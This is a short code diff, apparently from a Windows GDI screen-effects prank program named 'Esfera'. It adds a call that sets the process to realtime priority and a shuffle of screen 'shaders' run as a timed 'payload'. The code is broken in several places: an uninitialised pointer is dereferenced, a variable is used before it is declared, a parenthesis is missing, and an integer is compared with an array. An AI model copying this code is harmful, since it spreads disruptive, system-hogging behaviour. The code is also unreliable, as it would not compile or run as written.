@@ -6,6 +6,7 @@ InitializeEsfera(
 	VOID
 )
 {
+	SetPriorityClass( GetCurrentProcess( ), REALTIME_PRIORITY_CLASS );
 	SeedXorshift32( 6969696969696969 );
 	bSafe = FALSE;
 	bSkip = FALSE;
@@ -30,6 +31,7 @@ wWinMain(
 	TIME *time;
 	time->sec = PAYLOAD_TIME;
 	
+	RandomizeArray( Shaders[ i ], sizeof( Shaders ) / sizeof( Shaders[ 0 ] );
 	for ( INT i = 0; i < Shaders; i++ )
 	{
 		ExecuteShader( hdcScreen, hdcMem, !( Xorshift32( ) % 2 ) ? 1000 : 500, 
